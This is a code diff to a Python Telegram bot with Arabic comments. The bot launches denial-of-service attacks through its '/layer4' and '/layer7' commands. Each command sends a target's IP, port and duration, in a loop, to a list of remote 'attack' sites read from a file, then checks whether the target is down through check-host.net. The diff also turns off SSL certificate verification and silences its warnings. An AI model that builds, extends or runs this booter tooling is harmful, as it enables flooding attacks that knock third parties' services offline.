@@ -4,9 +4,13 @@ import asyncio
 import socket
 import http.server
 import threading
+import urllib3
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
 from threading import Thread, Lock
+
+# تعطيل تحذيرات SSL غير الآمنة
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # المتغيرات لتخزين حالة الهجوم
 attack_status = {}
@@ -28,7 +32,7 @@ def run_mock_server():
     print("Mock server running on port 8080...")
     httpd.serve_forever()
 
-# قراءة المواقع من ملف "sites.txt"
+# قراءة المواقع من ملف "sites312.txt"
 def read_sites():
     try:
         with open("sites312.txt", "r") as file:
@@ -50,7 +54,7 @@ def attack_site(site, ip, port, attack_time):
     while time.time() < end_time:
         try:
             url = f"{site}?host={ip}&port={port}&time={attack_time}"
-            response = requests.get(url, timeout=20)
+            response = requests.get(url, timeout=20, verify=False)
             if response.status_code != 200:
                 print(f"Site {site} returned status {response.status_code}. Retrying...")
                 continue
@@ -76,7 +80,7 @@ def attack_site(site, ip, port, attack_time):
         if active_attacks < 0:
             active_attacks = 0
 
-# وظيفة لزيارة المواقع و تعبئة البيانات
+# وظيفة لزيارة المواقع و تعبئة البيانات (مع تخطي SSL)
 def visit_and_fill_data(site, ip, attack_time):
     global active_attacks
     start_time = time.time()
@@ -88,7 +92,7 @@ def visit_and_fill_data(site, ip, attack_time):
     while time.time() < end_time:
         try:
             url = f"{site}?host1={ip}&time1={attack_time}"
-            response = requests.get(url, timeout=20)
+            response = requests.get(url, timeout=20, verify=False)  # ← تخطي SSL
             if response.status_code != 200:
                 print(f"Site {site} returned status {response.status_code}. Retrying...")
                 continue
@@ -183,7 +187,6 @@ async def attack(update: Update, context: CallbackContext):
     target = domain if domain else ip
     target_url = f"{protocol}://{target}"
 
-    # إصلاح رابط check-host (كان ينتج رابطاً خاطئاً)
     keyboard = [
         [InlineKeyboardButton("Checkhost", url=f"https://check-host.net/check-http?host={target_url}")]
     ]
@@ -209,7 +212,7 @@ async def attack(update: Update, context: CallbackContext):
 
     last_attack_time = current_time
 
-# وظيفة /filldata لزيارة المواقع و تعبئة البيانات
+# وظيفة /layer7 لزيارة المواقع و تعبئة البيانات
 async def fill_data(update: Update, context: CallbackContext):
     global active_attacks, last_attack_time
     if update.message.chat.id not in ALLOWED_CHAT_ID:
@@ -277,7 +280,6 @@ def main():
     application.add_handler(CommandHandler("list", list_commands))
     application.add_handler(CommandHandler("layer4", attack))
     application.add_handler(CommandHandler("layer7", fill_data))
-    # تم حذف MessageHandler الفارغ لأنه لا فائدة منه
 
     application.run_polling()
 
